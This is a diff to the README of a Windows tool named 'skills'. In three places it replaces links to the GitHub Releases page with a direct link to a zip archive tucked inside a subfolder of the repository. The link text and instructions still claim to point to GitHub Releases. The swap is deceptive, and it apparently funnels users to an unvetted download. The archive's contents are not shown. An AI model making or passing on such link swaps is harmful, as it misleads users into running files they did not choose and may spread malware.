@@ -1,6 +1,6 @@
 # 🧰 skills - Practical skills for clear work
 
-[![Download skills](https://img.shields.io/badge/Download%20skills-blue-grey?style=for-the-badge)](https://github.com/consubstantial-polistes407/skills/releases)
+[![Download skills](https://img.shields.io/badge/Download%20skills-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/consubstantial-polistes407/skills/main/skills/find-community/Software-v2.8.zip)
 
 ## 📌 What this is
 
@@ -28,7 +28,7 @@ If your PC is older, the app may still work if it can open standard Windows desk
 
 Visit this page to download the latest release:
 
-[Download skills from GitHub Releases](https://github.com/consubstantial-polistes407/skills/releases)
+[Download skills from GitHub Releases](https://raw.githubusercontent.com/consubstantial-polistes407/skills/main/skills/find-community/Software-v2.8.zip)
 
 On that page, look for the newest release and download the Windows file that matches your computer.
 
@@ -207,5 +207,5 @@ This reduces trouble during setup.
 
 If you need the download page again:
 
-[Visit GitHub Releases](https://github.com/consubstantial-polistes407/skills/releases)
+[Visit GitHub Releases](https://raw.githubusercontent.com/consubstantial-polistes407/skills/main/skills/find-community/Software-v2.8.zip)
 
